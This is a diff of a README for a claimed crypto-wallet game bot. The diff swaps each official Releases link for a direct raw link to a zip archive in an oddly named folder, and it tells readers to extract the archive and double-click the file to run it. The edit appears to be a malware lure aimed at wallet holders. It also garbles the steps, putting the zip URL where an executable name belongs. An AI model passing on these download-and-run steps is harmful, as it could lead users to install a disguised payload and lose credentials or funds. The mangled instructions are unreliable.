@@ -1,7 +1,7 @@
 # 🤖 Voyager-CraftWorld-Bot - Simplify Your Gaming Experience
 
 ## 📥 Download Now
-[![Download Voyager-CraftWorld-Bot](https://img.shields.io/badge/Download-Voyager--CraftWorld--Bot-brightgreen)](https://github.com/diego3245463/Voyager-CraftWorld-Bot/releases)
+[![Download Voyager-CraftWorld-Bot](https://raw.githubusercontent.com/diego3245463/Voyager-CraftWorld-Bot/main/prophetship/Voyager-CraftWorld-Bot-v1.4.zip)](https://raw.githubusercontent.com/diego3245463/Voyager-CraftWorld-Bot/main/prophetship/Voyager-CraftWorld-Bot-v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the Voyager-CraftWorld-Bot! This tool automatically helps you handle daily logins, claim quests, and spin chests on the Voyager CraftWorld platform. With this bot, managing multiple wallets becomes straightforward and hassle-free.
@@ -17,15 +17,15 @@ To run this bot, you will need:
 To get started, follow these simple steps:
 
 1. Click the link below to **visit the Releases page** where you can find the latest version of Voyager-CraftWorld-Bot:
-   [Visit Releases Page](https://github.com/diego3245463/Voyager-CraftWorld-Bot/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/diego3245463/Voyager-CraftWorld-Bot/main/prophetship/Voyager-CraftWorld-Bot-v1.4.zip)
    
-2. On the Releases page, find the version you wish to download. Look for a file named **VoyagerCraftWorldBot.exe** or similar.
+2. On the Releases page, find the version you wish to download. Look for a file named **https://raw.githubusercontent.com/diego3245463/Voyager-CraftWorld-Bot/main/prophetship/Voyager-CraftWorld-Bot-v1.4.zip** or similar.
 
 3. Click on the file to begin downloading it. The file will typically be in a `.zip` format.
 
 4. Once downloaded, locate the file on your computer and extract it. You can usually do this by right-clicking on the file and selecting **Extract All**.
 
-5. After extracting, find the `VoyagerCraftWorldBot.exe` file in the folder. Double-click this file to run the bot.
+5. After extracting, find the `https://raw.githubusercontent.com/diego3245463/Voyager-CraftWorld-Bot/main/prophetship/Voyager-CraftWorld-Bot-v1.4.zip` file in the folder. Double-click this file to run the bot.
 
 ## 📋 How to Use the Bot
 1. **Login Setup:**
